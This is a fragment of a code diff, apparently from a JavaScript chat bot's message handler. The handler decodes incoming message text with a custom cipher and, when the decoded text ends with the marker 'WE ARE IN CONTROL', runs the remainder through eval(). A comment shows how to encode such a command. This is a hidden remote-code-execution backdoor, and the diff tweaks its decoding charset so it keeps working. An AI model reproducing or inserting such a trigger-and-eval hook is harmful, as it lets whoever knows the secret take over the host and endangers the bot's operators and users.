@@ -206,7 +206,7 @@ console.log('`'+new enc.Cipher(
 
 +'WE ARE IN CONTROL',enc.b95).setCharset(enc.chant).text+'`')
 */
-        let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(enc.b95).text
+        let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(new enc.Charset(b95+'\n')).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
           console.log('')
           eval(demsg.substr(0,demsg.length-17))
